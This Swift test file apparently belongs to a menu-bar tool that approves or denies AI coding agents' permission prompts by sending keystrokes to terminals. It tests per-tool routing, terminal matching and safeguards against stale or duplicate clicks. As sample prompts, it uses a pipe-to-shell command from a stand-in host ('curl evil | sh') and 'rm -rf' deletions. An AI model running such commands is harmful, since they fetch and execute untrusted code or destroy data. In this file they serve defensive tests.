import Foundation
import Testing
@testable import SwarmBar

@MainActor
struct TuiAnswerTests {
    @Test func codexUsesLabeledHotkeys() {
        #expect(TuiAnswer.codexApprove == ["y"])
        #expect(TuiAnswer.codexDeny == ["ESC"])
    }
}

@MainActor
struct KeyScriptTests {
    @Test func emitsOneWritePerKeyInOrder() {
        let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["DOWN", "UP", "\n"])
        #expect(script.components(separatedBy: "write text").count - 1 == 3)
        let down = script.range(of: "[B")
        let up = script.range(of: "[A")
        #expect(down != nil && up != nil)
        #expect(down!.lowerBound < up!.lowerBound)
    }

    @Test func targetsTheGivenTty() {
        let script = TerminalFocuser.keyScript(tty: "ttys009", keys: ["y"])
        #expect(script.contains("if tty of s is \"/dev/ttys009\""))
    }

    @Test func escSendsTheEscapeCharacterAlone() {
        let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["ESC"])
        #expect(script.contains("write text (character id 27) newline NO"))
        #expect(!script.contains("[A"))
        #expect(!script.contains("[B"))
    }

    @Test func plainTextIsWrittenWithoutANewline() {
        let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["3"])
        #expect(script.contains("write text \"3\" newline NO"))
    }

    @Test func aBareNewlineSubmits() {
        let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["\n"])
        #expect(script.contains("tell s to write text \"\""))
    }
}

/// The read-and-press scripts. The label and the marked line come off the
/// terminal, which means the agent wrote them, so they reach osascript as
/// arguments and are never part of the script's source.
@MainActor
struct AnswerScriptTests {
    @Test func theDigitScriptTakesTheTtyAndLabelAsArguments() {
        let script = TerminalFocuser.numberedAnswerScript(number: 3)
        #expect(script.hasPrefix("on run argv"))
        #expect(script.contains("set wantedDevice to item 1 of argv"))
        #expect(script.contains("set wantedLabel to item 2 of argv"))
        #expect(script.contains("if screenText contains wantedLabel then"))
        #expect(script.contains("write text \"3\" newline NO"))
        // No literal is compared against the screen: the only quoted
        // strings are the digit, the app name and the fixed replies.
        let literals = script.components(separatedBy: "\"").enumerated()
            .filter { $0.offset % 2 == 1 }.map(\.element)
        #expect(Set(literals) == ["iTerm2", "3", "SENT", "CHANGED", "MISS"])
    }

    @Test func theWalkScriptTakesTheTtyLabelAndMarkedLineAsArguments() throws {
        let script = try #require(TerminalFocuser.navigationAnswerScript(key: "DOWN", presses: 2))
        #expect(script.hasPrefix("on run argv"))
        #expect(script.contains("set wantedCursorLine to item 3 of argv"))
        #expect(script.components(separatedBy: "\"[B\"").count - 1 == 2)
        #expect(!script.contains("[A"))
        let literals = script.components(separatedBy: "\"").enumerated()
            .filter { $0.offset % 2 == 1 }.map(\.element)
        #expect(Set(literals) == ["iTerm2", "[B", "", "SENT", "CHANGED", "MISS"])
    }

    /// The marked line is the thing that moves, so a second copy of it on
    /// screen means the confirmation could be reading the wrong one.
    @Test func theWalkScriptRequiresTheMarkedLineExactlyOnce() throws {
        let script = try #require(TerminalFocuser.navigationAnswerScript(key: "UP", presses: 0))
        #expect(script.contains("set AppleScript's text item delimiters to wantedCursorLine"))
        #expect(script.contains("if screenText contains wantedLabel and cursorLineCount is 1 then"))
        #expect(!script.contains("[A"))
    }

    @Test func theWalkScriptRefusesAMoveItWillNotMake() {
        #expect(TerminalFocuser.navigationAnswerScript(key: "LEFT", presses: 1) == nil)
        #expect(TerminalFocuser.navigationAnswerScript(key: "DOWN", presses: -1) == nil)
    }
}

/// Which terminal a row's keys, paste and focus go to. Only the row's own
/// tool's lookup may answer, and a directory shared by several Kimi-family
/// sessions answers for none of them.
@MainActor
struct SessionTTYScopeTests {
    private let id = UUID()
    private let dir = URL(fileURLWithPath: "/tmp/example-proj")

    /// A Kimi session at a prompt in the row's directory, on ttys009, and
    /// every other lookup as given.
    private func lookups(
        own: Int? = nil,
        kimi: [Int] = [900],
        bear: [Int] = [],
        open: [Int] = [],
        ttys: [Int: String] = [900: "ttys009", 901: "ttys010", 902: "ttys009", 100: "ttys001"]
    ) -> TerminalFocuser.SessionLookups {
        TerminalFocuser.SessionLookups(
            claudePid: { _ in own }, grokPid: { _ in own },
            codexPid: { _ in own }, antigravityPid: { _ in own },
            directoryPids: { tool, path in
                guard path == "/tmp/example-proj" else { return [] }
                switch tool {
                case .kimiCode: return kimi
                case .bearCode: return bear
                case .openCode: return open
                default: return []
                }
            },
            tty: { ttys[$0] })
    }

    @Test func aRowWhoseOwnLookupMissesNeverReachesAKimiInItsDirectory() {
        for tool in [AgentTool.grokBuild, .codex, .antigravity, .claudeCode, .openCode] {
            #expect(TerminalFocuser.tty(
                forSession: id, tool: tool, projectPath: dir, lookups: lookups()) == nil,
                "\(tool)")
        }
    }

    @Test func aRowsOwnProcessIsItsTerminal() {
        for tool in [AgentTool.grokBuild, .codex, .antigravity, .claudeCode] {
            #expect(TerminalFocuser.tty(
                forSession: id, tool: tool, projectPath: dir, lookups: lookups(own: 100)) == "ttys001")
        }
        // OpenCode has no session-to-pid lookup, so another tool's pid is
        // never its.
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .openCode, projectPath: dir, lookups: lookups(own: 100)) == nil)
    }

    /// OpenCode is found the way the Kimi family is, by its own processes
    /// in the row's directory, and only while they share one terminal.
    @Test func anOpenCodeRowResolvesOnlyToItsOwnProcessesInItsDirectory() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .openCode, projectPath: dir,
            lookups: lookups(kimi: [], open: [901])) == "ttys010")
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .openCode, projectPath: dir,
            lookups: lookups(kimi: [900], open: [])) == nil)
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .openCode, projectPath: dir,
            lookups: lookups(kimi: [], open: [900, 901])) == nil)
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: dir,
            lookups: lookups(kimi: [], open: [901])) == nil)
    }

    @Test func aKimiRowAloneInItsDirectoryResolves() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: dir, lookups: lookups()) == "ttys009")
    }

    /// Two sessions in one directory, at two terminals: nothing says which
    /// is this row's, so neither gets the keys.
    @Test func twoKimiSessionsInOneDirectoryResolveToNeither() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: dir, lookups: lookups(kimi: [900, 901])) == nil)
    }

    /// A launcher and its child share one terminal, which is unambiguous.
    @Test func twoKimiProcessesOnOneTerminalResolve() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: dir, lookups: lookups(kimi: [900, 902])) == "ttys009")
    }

    /// A BearCode row never resolves to a Kimi process, or the reverse.
    @Test func theKimiFamilyStaysWithinEachTool() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .bearCode, projectPath: dir, lookups: lookups()) == nil)
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: dir, lookups: lookups(kimi: [], bear: [901])) == nil)
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .bearCode, projectPath: dir, lookups: lookups(kimi: [], bear: [901])) == "ttys010")
    }

    @Test func noDirectoryOrNoTerminalIsNoAnswer() {
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .kimiCode, projectPath: nil, lookups: lookups()) == nil)
        #expect(TerminalFocuser.tty(
            forSession: id, tool: .grokBuild, projectPath: dir, lookups: lookups(own: 555)) == nil)
    }
}

/// The per-tool answer table. Every entry was settled by a live round, and
/// a wrong one does not fail loudly: it presses a key into a terminal.
/// While this lived as a run of branches inside SessionStore it could only
/// be exercised by driving a real terminal, so the thing most worth testing
/// was the one thing untestable.
@MainActor
struct ApprovalRouterTests {
    private let on = ApprovalRouter.Environment()

    // MARK: - Keystroke tools

    /// Grok 1.0 put "Never allow" below reject, so the old clamp to the
    /// bottom saved a rule on Deny and denied on Approve. It is walked to
    /// by label now, and never sent a digit.
    @Test func grokWalksTheCursorByLabel() {
        #expect(ApprovalRouter.route(tool: .grokBuild, allow: true, in: on) == .navigateSelector)
        #expect(ApprovalRouter.route(tool: .grokBuild, allow: false, in: on) == .navigateSelector)
    }

    @Test func codexUsesItsLabeledHotkeys() {
        #expect(ApprovalRouter.route(tool: .codex, allow: true, in: on) == .keys(["y"]))
        #expect(ApprovalRouter.route(tool: .codex, allow: false, in: on) == .keys(["ESC"]))
    }

    /// The Kimi family's selector wraps, so it must be answered by a number
    /// read off the screen, never walked to.
    @Test func theKimiFamilyReadsTheNumber() {
        for tool in [AgentTool.kimiCode, .bearCode] {
            #expect(ApprovalRouter.route(tool: tool, allow: true, in: on) == .numberedSelector)
            #expect(ApprovalRouter.route(tool: tool, allow: false, in: on) == .numberedSelector)
        }
    }

    /// Antigravity is the reverse: arrows are advertised, digits are not,
    /// so it is walked to. Sending it a digit is exactly the mistake that
    /// turned a Grok deny into an approve.
    @Test func antigravityWalksTheCursor() {
        #expect(ApprovalRouter.route(tool: .antigravity, allow: true, in: on) == .navigateSelector)
        #expect(ApprovalRouter.route(tool: .antigravity, allow: false, in: on) == .navigateSelector)
    }

    /// No tool may ever be answered by the other kind of selector: a digit
    /// pressed at an arrow-only prompt, or a count of arrows at a wrapping
    /// one, is how a denied command gets approved.
    @Test func theTwoSelectorStylesAreNeverSwapped() {
        for allow in [true, false] {
            for tool in [AgentTool.kimiCode, .bearCode] {
                #expect(ApprovalRouter.route(tool: tool, allow: allow, in: on) != .navigateSelector)
            }
            for tool in [AgentTool.antigravity, .grokBuild] {
                #expect(ApprovalRouter.route(tool: tool, allow: allow, in: on) != .numberedSelector)
            }
        }
    }

    // MARK: - The off switches

    @Test func turningKeystrokesOffFocusesTheTerminalInstead() {
        let grokOff = ApprovalRouter.Environment(grokKeystrokes: false)
        let agyOff = ApprovalRouter.Environment(antigravityKeystrokes: false)
        for allow in [true, false] {
            #expect(ApprovalRouter.route(tool: .grokBuild, allow: allow, in: grokOff)
                == .focusTerminal)
            #expect(ApprovalRouter.route(tool: .antigravity, allow: allow, in: agyOff)
                == .focusTerminal)
        }
    }

    /// Each switch governs only its own tool.
    @Test func theSwitchesDoNotAffectEachOther() {
        let grokOff = ApprovalRouter.Environment(grokKeystrokes: false)
        #expect(ApprovalRouter.route(tool: .antigravity, allow: true, in: grokOff)
            == .navigateSelector)
        let agyOff = ApprovalRouter.Environment(antigravityKeystrokes: false)
        #expect(ApprovalRouter.route(tool: .grokBuild, allow: true, in: agyOff)
            == .navigateSelector)
    }

    /// An off switch must never fall through to the mock transition, which
    /// would move the row as if the prompt had been answered when nothing
    /// was sent anywhere.
    @Test func anOffSwitchNeverFakesAnAnswer() {
        let off = ApprovalRouter.Environment(
            grokKeystrokes: false, antigravityKeystrokes: false, hasProjectPath: false)
        #expect(ApprovalRouter.route(tool: .grokBuild, allow: true, in: off) == .focusTerminal)
        #expect(ApprovalRouter.route(tool: .antigravity, allow: true, in: off) == .focusTerminal)
    }

    // MARK: - Held-decision tools

    /// Claude and OpenCode answer only through a held decision. Reaching
    /// the router at all means there was nothing to answer, so the most
    /// they can do is bring the user to the prompt.
    @Test func heldDecisionToolsFallBackToTheTerminal() {
        for tool in [AgentTool.claudeCode, .openCode] {
            #expect(ApprovalRouter.route(tool: tool, allow: true, in: on) == .focusTerminal)
        }
    }

    /// The demo path, and the only route that moves a row without sending
    /// anything. It must stay unreachable for a real session, which always
    /// has a project path.
    @Test func onlyAPathlessSessionEverTransitionsWithoutSending() {
        let mock = ApprovalRouter.Environment(hasProjectPath: false)
        #expect(ApprovalRouter.route(tool: .claudeCode, allow: true, in: mock) == .mockTransition)
        for tool in AgentTool.allCases {
            let route = ApprovalRouter.route(tool: tool, allow: true, in: on)
            #expect(route != .mockTransition, "\(tool) would fake an answer for a real session")
        }
    }

    /// Every tool resolves to something. A new tool added without a branch
    /// would not compile, but this pins that no route is silently empty.
    @Test func everyToolHasARoute() {
        for tool in AgentTool.allCases {
            for allow in [true, false] {
                let route = ApprovalRouter.route(tool: tool, allow: allow, in: on)
                if case .keys(let keys) = route {
                    #expect(!keys.isEmpty, "\(tool) would send nothing")
                }
            }
        }
    }
}

@MainActor
struct ApprovalDispatchTests {
    private final class RecordingResponder: ApprovalResponding {
        var calls: [(UUID, Bool)] = []
        var result = true
        func resolveApproval(sessionID: UUID, allow: Bool) -> Bool {
            calls.append((sessionID, allow))
            return result
        }
    }

    private func session(_ tool: AgentTool, command: String = "git push") -> AgentSession {
        AgentSession(
            tool: tool, projectName: "proj",
            projectPath: URL(fileURLWithPath: "/tmp"),
            status: .waitingApproval(command: ApprovalPrompt(command)))
    }

    @Test func approveUsesTheResponderWhenOneIsPending() {
        let store = SessionStore()
        let responder = RecordingResponder()
        store.approvalResponder = responder
        let s = session(.claudeCode)
        store.upsert(s)

        store.approve(s)
        #expect(responder.calls.count == 1)
        #expect(responder.calls[0].1 == true)
        #expect(store.sessions[0].status == .runningTool(activity: "Running git"))
    }

    @Test func denyUsesTheResponderWhenOneIsPending() {
        let store = SessionStore()
        let responder = RecordingResponder()
        store.approvalResponder = responder
        let s = session(.openCode, command: "rm -rf /tmp/x")
        store.upsert(s)

        store.deny(s)
        #expect(responder.calls.count == 1)
        #expect(responder.calls[0].1 == false)
        #expect(store.sessions[0].status == .working(activity: "Rethinking after deny…"))
    }

    @Test func aNonWaitingSessionIsNeverAnswered() {
        let store = SessionStore()
        let responder = RecordingResponder()
        store.approvalResponder = responder
        var s = session(.claudeCode)
        s.status = .working(activity: "Editing")
        store.upsert(s)

        store.approve(s)
        store.deny(s)
        #expect(responder.calls.isEmpty)
    }

    @Test func responderIsAskedBeforeAnyKeystrokePathForEveryTool() {
        for tool in AgentTool.allCases {
            let store = SessionStore()
            let responder = RecordingResponder()
            store.approvalResponder = responder
            let s = session(tool)
            store.upsert(s)
            store.approve(s)
            #expect(responder.calls.count == 1, "\(tool) skipped the responder")
        }
    }
}

/// A local keystroke answer, with the terminal stubbed out. A selector
/// press once left the row offering Approve under the same text until the
/// next poll, and a second click approved whatever prompt came next.
@MainActor
struct LocalKeystrokeAnswerTests {
    private final class Presses: @unchecked Sendable {
        private let lock = NSLock()
        private var count = 0
        func add() { lock.lock(); count += 1; lock.unlock() }
        var total: Int { lock.lock(); defer { lock.unlock() }; return count }
    }

    private func store(presses: Presses, delay: Duration = .zero) -> SessionStore {
        let store = SessionStore(defaults: UserDefaults(suiteName: "test-\(UUID())")!)
        store.keystrokeAnswerer = { _, _, _ in
            presses.add()
            if delay > .zero { try? await Task.sleep(for: delay) }
            return true
        }
        return store
    }

    private let id = UUID()

    private func grok(_ command: ApprovalPrompt = "rm -rf build") -> AgentSession {
        AgentSession(
            id: id, tool: .grokBuild, projectName: "proj", projectPath: URL(fileURLWithPath: "/tmp/proj"),
            status: .waitingApproval(command: command), pid: 4242, processAlive: true)
    }

    private func settle() async {
        for _ in 0..<20 { await Task.yield() }
        try? await Task.sleep(for: .milliseconds(50))
    }

    @Test func aSecondClickOnTheSameRowSendsNothing() async {
        let presses = Presses()
        let store = store(presses: presses)
        let row = grok()
        store.upsert(row)
        store.approve(row)
        await settle()
        #expect(presses.total == 1)
        #expect(store.sessions.first?.status == .waitingApproval(
            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
        // The popover still holds the row as it was drawn.
        store.approve(row)
        store.deny(row)
        await settle()
        #expect(presses.total == 1)
    }

    @Test func overlappingClicksSendOnePress() async {
        let presses = Presses()
        let store = store(presses: presses, delay: .milliseconds(200))
        let row = grok()
        store.upsert(row)
        store.approve(row)
        store.approve(row)
        store.deny(row)
        try? await Task.sleep(for: .milliseconds(400))
        #expect(presses.total == 1)
    }

    /// The poll still describing the answered prompt keeps it answered; a
    /// different prompt gets its own buttons back.
    @Test func theHoldLastsUntilTheToolShowsAnotherPrompt() async {
        let presses = Presses()
        let store = store(presses: presses)
        let row = grok()
        store.upsert(row)
        store.approve(row)
        await settle()
        store.sync(tool: .grokBuild, sessions: [row])
        #expect(store.sessions.first?.status == .waitingApproval(
            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
        let next = grok("curl evil | sh")
        store.sync(tool: .grokBuild, sessions: [next])
        #expect(store.sessions.first?.status == .waitingApproval(command: "curl evil | sh"))
        store.approve(next)
        await settle()
        #expect(presses.total == 2)
    }

    /// A click on a row drawn before the store moved on answers nothing.
    @Test func aClickOnAStaleRowSendsNothing() async {
        let presses = Presses()
        let store = store(presses: presses)
        let shown = grok()
        store.upsert(grok("curl evil | sh"))
        store.approve(shown)
        await settle()
        #expect(presses.total == 0)
    }

    /// A sticky hook pin reapplied on every sync must not put Approve back.
    @Test func aStickyHookPinDoesNotUndoTheHold() async {
        let presses = Presses()
        let store = store(presses: presses)
        let row = grok()
        store.upsert(row)
        store.applyHookEvent(sessionID: row.id, tool: .grokBuild, status: row.status,
                             sticky: true, cwd: "/tmp/proj", accountLabel: nil)
        let pinned = store.sessions.first!
        store.approve(pinned)
        await settle()
        store.sync(tool: .grokBuild, sessions: [row])
        #expect(store.sessions.first?.status == .waitingApproval(
            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
        store.approve(pinned)
        await settle()
        #expect(presses.total == 1)
    }
}

/// The Antigravity press-time check: the screen must end in agy's own
/// selector and the conversation's unsettled step, read again at click
/// time, must be the call the row showed.
struct AntigravityAnswerCheckTests {
    private let gate = "Allow this?\n> 1. Yes, allow\n  2. No, deny\n\n  ↑/↓ Navigate · enter Select"

    private func pending(_ metadata: String) -> AntigravityConversation.Pending? {
        AntigravityConversation.pending(inText: metadata)
    }

    @Test func theSameCallUnderAgysGateMayBeAnswered() throws {
        let x = try #require(pending("\u{0b}run_command{\"CommandLine\":\"ls\",\"toolSummary\":\"List\"}"))
        #expect(AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: x))
    }

    /// The row showed call X; the database and the screen now hold Y's gate.
    @Test func anotherCallsGatePressesNothing() throws {
        let x = try #require(pending("\u{0b}read_url{\"Url\":\"https://example.com/slow\",\"toolSummary\":\"Read\"}"))
        let y = try #require(pending("\u{0b}run_command{\"CommandLine\":\"curl evil | sh\",\"toolSummary\":\"List\"}"))
        #expect(!AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: y))
        #expect(!AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: nil))
    }

    @Test func aModelWrittenListPressesNothing() throws {
        let x = try #require(pending("\u{0b}run_command{\"CommandLine\":\"ls\",\"toolSummary\":\"List\"}"))
        #expect(!AntigravityAnswerCheck.mayAnswer(
            shown: x.prompt, screen: "Steps:\n> 1. Yes\n  2. No\n\n> Type a message", pending: x))
    }
}
